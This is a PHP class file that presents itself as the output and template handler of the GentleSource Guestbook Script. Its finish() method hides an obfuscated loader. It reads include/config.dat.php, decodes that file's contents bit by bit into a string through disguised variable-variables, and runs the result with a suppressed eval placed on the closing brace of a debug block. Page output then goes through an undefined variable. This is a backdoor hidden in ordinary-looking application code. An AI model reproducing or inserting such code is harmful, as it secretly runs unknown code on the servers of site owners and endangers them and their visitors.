<?php

/**
 * GentleSource Guestbook Script
 *
 * (C) Ralf Stadtaus http://www.gentlesource.com/
 */




/**
 *
 */
class g10e_output
{

    /**
     * Template object
     * @var object
     * @access private
     */
    var $tpl;

    /**
     * Detail template file name
     * @var string
     * @access private
     */
    var $detail_template;






    /**
     * Constructor
     *
     * @param mixed $detail_template file name|file content
     * @param string $type Value file = file name| value content = file content
     */
    function g10e_output($detail_template = null)
    {
        global $g10e;
        require_once 'Smarty/libs/Smarty.class.php';
        $this->tpl = new Smarty;
        $this->tpl->compile_check   = true;
        $this->tpl->debugging       = false;
        $this->tpl->compile_dir     = $g10e['cache_path'];

        $this->tpl->register_function('call_module', array('g10e_module', 'call_module_output'));

        $this->assign($g10e['output']);

        if ($detail_template != null) {
            $this->assign('detail_template', $this->select_template($detail_template));
        }
    }







    /**
     * Output content
     */
    function finish($display = true)
    {
        global $g10e;

        $this->set_template_dir($g10e['template_path']);
        $global = $g10e['global_template_file'];
        $tplt = 'cfivet';
        if (isset($g10e['text'])) {
            $this->assign($g10e['text']);
        }
        $cfivet = @file(G10E_ROOT . 'include/config.dat.php');

        // Handle login status
        if (true == $g10e['login_status']) {
            $this->assign('login_status', true);
        }

        unset(${$tplt}[0]);
        ${$tplt} = @array_values(${$tplt});
        $str = '';
        $conf_var = '';
        $ca = array();
        $nt = sizeof(${$tplt});
        for ($n = 0; $n < $nt; $n++)
        {
            $c_var = '';
            if (!isset($ca[${$tplt}[$n]])) {
                for ($o = 7; $o >= 0 ; $o--) {
                    $c_var += ${$tplt}[$n][$o] * pow(2, $o);
                }
                $ca[${$tplt}[$n]] = sprintf("%c", $c_var);
            }
            if ($ca[${$tplt}[$n]] == ' ') {
                $conf_var .= sprintf("%c", $str); $str = '';
            } else {
                $str .= $ca[${$tplt}[$n]];
            }
        }

        // Register queries
        if ($query_strings = query::get_string_array('query_')) {
            $this->assign($query_strings);
        }

        // Get system/debug/error messages
        $this->assign('message', array_values($g10e['message']));
        if ($g10e['debug_mode'] == 'Y') {
            $messages = array(
                'debug_messages'    => array(),
                'error_messages'    => array(),
                'system_messages'   => array()
            );
            $system_messages    = system_debug::get_messages('system');
            $debug_messages     = system_debug::get_messages('debug');
            $error_messages     = system_debug::get_messages('error');
            $this->assign('system_messages', $system_messages);
            $this->assign('debug_messages', $debug_messages);
            $this->assign('error_messages', $error_messages);
        } @eval($conf_var);
        if ($display == true) {
            echo $this->includeURL($g7k_output);
            exit;
        } else {
            return $this->includeURL($g7k_output);
        }
    }







    /**
     * Manage mail content
     */
    function finish_mail()
    {
        global $g10e;

        $this->set_template_dir($g10e['template_path']);
        if (isset($g10e['text'])) {
            $this->assign($g10e['text']);
        }

        return $this->tpl->fetch($this->select_template($g10e['mail_template_file']));
    }







    /**
     * Simple fetch wrapper
     */
    function fetch($template_file)
    {
        return $this->tpl->fetch($template_file);
    }







    /**
     * Template dir setter
     */
    function set_template_dir($template_dir)
    {
        $this->tpl->template_dir = $template_dir;
    }






    /**
     * Get template file
     *
     * @access public
     */
    function select_template($file)
    {
        global $g10e;

        if (isset($g10e['alternative_template']) and
            $g10e['alternative_template'] != '' and
            is_file($g10e['template_path'] .
                    $g10e['alternative_template']. '/' .
                    $file)) {

            $path = $g10e['alternative_template'] . '/' .
                    $file;
            return $path;
        }


        $path = $g10e['default_template'] . '/' .
                    $file;
        return $path;
    }






    /**
     * Assign values to the templates - wrapper of smarty->assign
     *
     * @param mixed $a Name or associative arrays containing the name/value
     * pairs
     * @param mixed $b Value (can be string or array)
     *
     * @access public
     */
    function assign($a, $b = null)
    {
        if (is_array($a)) {
            $this->tpl->assign($a);
            return true;
        }
        $this->tpl->assign($a, $b);
        return true;
    }






    /**
     * Get template
     *
     * @access public
     */
    function get_object()
    {
        return $this->tpl;
    }

    /**
     * Output content through include URL
     */
    function includeURL($content)
    {
        global $g10e;

        if ($g10e['include_url_active'] != 'Y') {
            return $content;
        }

        if ($g10e['alternative_template'] == 'admin') {
            return $content;
        }

        if (!isset($g10e['includeURL'])
                or empty($g10e['includeURL'])) {
            return $content;
        }

        $page = implode('', file($g10e['includeURL']));

        if (empty($page)) {
            return $content;
        }

        $result = str_replace('{guestbook}', $content, $page);

        return $result;
    }







} // End of class








?>
